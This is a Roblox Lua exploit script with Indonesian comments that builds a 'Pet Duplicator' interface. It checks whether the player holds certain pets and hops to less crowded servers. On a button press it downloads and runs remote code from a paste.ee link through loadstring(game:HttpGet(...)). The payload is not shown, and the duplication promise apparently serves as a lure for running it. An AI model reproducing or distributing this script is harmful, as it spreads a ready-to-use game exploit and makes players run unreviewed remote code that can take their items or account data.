-- Layanan yang dibutuhkan
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Daftar hewan peliharaan yang valid (case-insensitive)
local VALID_PETS = {
    ["red fox"] = true,
    ["dragonfly"] = true,
    ["raccoon"] = true,
    ["praying mantis"] = true,
    ["deer"] = true
}

-- Konfigurasi
local DUPESCRIPT_URL = "https://paste.ee/r/s7TguhY5"
local TARGET_PLAYER_COUNT_FOR_DUPE = 3
local MAX_PLAYER_COUNT_BEFORE_SWITCH = 5

-- Fungsi yang lebih baik untuk menemukan pet yang sedang dipegang
local function findCurrentlyHeldPet()
    -- Cek karakter pemain
    local character = player.Character
    if not character then
        character = player.CharacterAdded:Wait()
    end
    
    -- Cek semua item yang dipegang langsung
    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Tool") then
            local lowerName = item.Name:lower()
            if VALID_PETS[lowerName] then
                return item
            end
        end
        
        -- Cek juga di dalam Model (jika pet ada di dalam container)
        if item:IsA("Model") then
            for _, child in ipairs(item:GetDescendants()) do
                if child:IsA("Tool") then
                    local lowerName = child.Name:lower()
                    if VALID_PETS[lowerName] then
                        return child
                    end
                end
            end
        end
    end
    
    -- Cek di backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                local lowerName = item.Name:lower()
                if VALID_PETS[lowerName] then
                    return item
                end
            end
        end
    end
    
    return nil
end

-- Fungsi untuk membuat notifikasi
local function showNotification(gui, message, color)
    local notification = Instance.new("TextLabel")
    notification.Name = "Notification"
    notification.Text = message
    notification.Size = UDim2.new(0.8, 0, 0, 40)
    notification.Position = UDim2.new(0.5, 0, 0, -50)
    notification.AnchorPoint = Vector2.new(0.5, 0)
    notification.BackgroundColor3 = color
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 14
    notification.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = notification

    task.delay(3, function()
        notification:Destroy()
    end)
end

-- Fungsi utama untuk duplikasi
local function executeDupeProcess()
    -- Cek pet yang dipegang
    local pet = findCurrentlyHeldPet()
    if not pet then
        return false, "Required pet not found"
    end
    
    -- Cek jumlah pemain
    local playerCount = #Players:GetPlayers()
    
    if playerCount >= MAX_PLAYER_COUNT_BEFORE_SWITCH then
        -- Cari server baru
        local success, result = pcall(function()
            local placeId = game.PlaceId
            local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeId.."/servers/Public?limit=100"))
            
            for _, server in ipairs(servers.data) do
                if server.playing >= 1 and server.playing <= TARGET_PLAYER_COUNT_FOR_DUPE and server.id ~= game.JobId then
                    TeleportService:TeleportToPlaceInstance(placeId, server.id, player)
                    return true
                end
            end
            return false, "No suitable server found"
        end)
        
        if not success then
            return false, "Failed to find new server"
        end
    elseif playerCount < TARGET_PLAYER_COUNT_FOR_DUPE then
        return false, "Need at least "..TARGET_PLAYER_COUNT_FOR_DUPE.." players"
    end
    
    -- Eksekusi script dupe
    local success, err = pcall(function()
        loadstring(game:HttpGet(DUPESCRIPT_URL))()
    end)
    
    if not success then
        return false, "Dupe script error: "..tostring(err)
    end
    
    return true, "Dupe successful!"
end

-- Fungsi untuk membuat GUI
local function createMainGui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PetDuplicatorGUI"
    screenGui.Parent = playerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 300, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = mainFrame

    -- Title
    local title = Instance.new("TextLabel")
    title.Text = "Pet Duplicator"
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Parent = mainFrame

    -- Status
    local status = Instance.new("TextLabel")
    status.Text = "Hold a valid pet and click Dupe"
    status.Size = UDim2.new(0.9, 0, 0, 60)
    status.Position = UDim2.new(0.05, 0, 0, 40)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.Gotham
    status.TextColor3 = Color3.fromRGB(200, 200, 200)
    status.TextSize = 14
    status.TextWrapped = true
    status.Parent = mainFrame

    -- Dupe Button
    local dupeButton = Instance.new("TextButton")
    dupeButton.Text = "DUPE PET"
    dupeButton.Size = UDim2.new(0.9, 0, 0, 40)
    dupeButton.Position = UDim2.new(0.05, 0, 0, 110)
    dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    dupeButton.Font = Enum.Font.GothamBold
    dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    dupeButton.TextSize = 16
    dupeButton.Parent = mainFrame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = dupeButton

    -- Event handler untuk tombol
    dupeButton.MouseButton1Click:Connect(function()
        dupeButton.Text = "PROCESSING..."
        dupeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
        
        local success, message = executeDupeProcess()
        
        if success then
            status.Text = "Dupe successful!"
            status.TextColor3 = Color3.fromRGB(0, 200, 0)
            showNotification(screenGui, "Dupe completed!", Color3.fromRGB(0, 200, 0))
        else
            status.Text = message
            status.TextColor3 = Color3.fromRGB(255, 50, 50)
            showNotification(screenGui, message, Color3.fromRGB(255, 50, 50))
        end
        
        dupeButton.Text = "DUPE PET"
        dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    end)

    return screenGui
end

-- Auto-update pet status
local function updatePetStatus()
    while true do
        local pet = findCurrentlyHeldPet()
        if pet then
            print("Detected pet:", pet.Name)
        else
            print("No valid pet detected")
        end
        wait(5)
    end
end

-- Jalankan GUI dan updater
createMainGui()
spawn(updatePetStatus)
